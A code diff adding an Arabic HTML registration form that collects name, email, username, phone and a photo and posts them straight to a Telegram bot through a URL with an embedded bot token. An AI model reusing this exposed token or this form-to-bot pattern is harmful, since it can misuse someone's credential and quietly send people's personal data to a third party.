@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>صفحة الاستمارة</title>
+    <style>
+        /* أضف أي تنسيقات CSS هنا */
+    </style>
+</head>
+<body>
+    <h1>استمارة التسجيل</h1>
+
+    <form id="myForm" action="https://api.telegram.org/bot2039440649:AAHOEC8T8mpuPRjv7iMovYsibH1fOffINJc/sendMessage" method="POST">
+        <label for="fullName">الاسم الكامل:</label><br>
+        <input type="text" id="fullName" name="fullName"><br><br>
+
+        <label for="email">البريد الإلكتروني:</label><br>
+        <input type="email" id="email" name="email"><br><br>
+
+        <label for="username">اسم المستخدم:</label><br>
+        <input type="text" id="username" name="username"><br><br>
+
+        <label for="phone">رقم الهاتف:</label><br>
+        <input type="tel" id="phone" name="phone"><br><br>
+
+        <label for="image">صورة:</label><br>
+        <input type="file" id="image" name="image"><br><br>
+
+        <!-- إضافة زر لإرسال البيانات -->
+        <input type="submit" value="أرسل">
+    </form>
+
+    <!-- إضافة نص يظهر بعد إرسال البيانات -->
+    <p id='response'></p>
+
+    <!-- إضافة نص يظهر في حال حدوث خطأ في إرسال البيانات -->
+    <p id='error'></p>
+
+    <!-- إضافة نص يظهر أثناء إجراء عملية الإرسال -->
+    <p id='loading'>يرجى الانتظار...</p>
+
+    <!-- تضمين ملف JavaScript -->
+    <script src='script.js'></script>
+</body>
+</html>
